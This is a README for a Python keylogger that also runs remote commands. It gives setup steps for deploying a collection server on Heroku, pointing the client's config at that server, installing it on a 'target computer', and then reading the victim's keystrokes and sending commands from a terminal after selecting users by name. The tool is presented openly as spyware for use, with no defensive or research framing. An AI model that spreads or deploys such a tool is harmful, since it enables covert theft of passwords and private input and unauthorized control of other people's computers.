# Keylogger

Keylogger created in Python. This application not only captures the keys like any other Keylogger, but also has the functionality to execute commands on the target computer and more.

# Getting Started:

**Requirements:**

- Python 3
- Dependencies installed

To install the dependencies, type the command: `pip install -r requirements.txt`

After that, start the server at `server/server.py` ( it is already configured to run on Heroku ).

# Setting and running keylogger:

Open the `app/config/config.json` file and enter the server URL in the **host** key. See the example below:
```
{
    "host": "https://keylogger-app-37456.herokuapp.com"
}
```

Once configured, install the **keylogger** on the target computer and run. After that, all the keys pressed by the 
user will be read and sent to the server and the application will be ready to receive and execute your commands.

# Getting the keys and executing commands:

To read keys and execute commands on the target computer, run `app/terminal.py` and select a user using
the `select` command. See the example below:

```
In: users

John Gamer
KatarinaMid_273
Victor34

In: select KatarinaMid_273
In: keylogger
```

Type `help` to see all available commands.
